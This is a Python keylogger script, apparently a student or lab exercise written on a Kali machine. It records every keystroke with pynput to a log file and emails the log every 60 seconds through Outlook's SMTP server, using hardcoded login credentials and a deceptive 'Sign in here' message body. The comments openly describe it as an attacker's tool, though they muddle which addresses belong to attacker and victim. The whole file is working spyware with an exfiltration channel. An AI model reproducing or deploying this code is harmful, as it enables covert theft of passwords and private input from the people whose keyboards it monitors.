from pynput.keyboard import Listener  # This is only for listening to the keyboard keystrokes
import logging  # This will help save the keystrokes in a log file
import smtplib  # This is used for sending the email
from email.mime.text import MIMEText  # For formatting the email text, keep it neat and easy to understand
import threading  # For running code periodically

# email information
your_email = "Victimab14@outlook.com"  # Attacker's email address
your_password = "ab12cd34"  # Attacker's email password
send_to_email = ["Victimab12@outlook.com", "Victimab13@outlook.com", "Victimab15@outlook.com"]  # Victim email addresses

# Set up where to save the key logs
log_file = "/home/kali/key_log.txt"

# Setting up the logging to write keystrokes into a file
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# This captures each key press
def on_press(key):
    logging.info(str(key))  # Logs each key press in the log file

# This function will send the log file to the email every 60 seconds
def send_email():
    try:
        # Open the log file and read its content
        with open(log_file, "r") as f:
            key_log_content = f.read()

        # The email message
        body = f"Sign in here:\n\n{key_log_content}"  # The body will say "Sign in here" to trick the victim
        msg = MIMEText(body)
        msg['From'] = your_email
        msg['Subject'] = "Keylogger Report"

        # Connect to the email server (which will be Outlook)
        server = smtplib.SMTP('smtp-mail.outlook.com', 587)  # Outlook SMTP server
        server.starttls()  # Encrypt the connection
        server.login(your_email, your_password)  # Login to the attacker's email

        # Send the email to each recipient (victim emails)
        for recipient in send_to_email:
            msg['To'] = recipient
            server.sendmail(your_email, recipient, msg.as_string())

        server.quit()

        print("Log sent successfully")

    except Exception as e:
        print(f"Failed to send email: {e}")

# Function to repeatedly send the log every 60 seconds
def send_email_periodically(interval=60):
    send_email()  # Send the log now
    threading.Timer(interval, send_email_periodically).start()  # Schedule the next email

# Start the email sending in the background
send_email_periodically()

# This will start listening for keyboard inputs
with Listener(on_press=on_press) as listener:
    listener.join()  # Keep the listener running
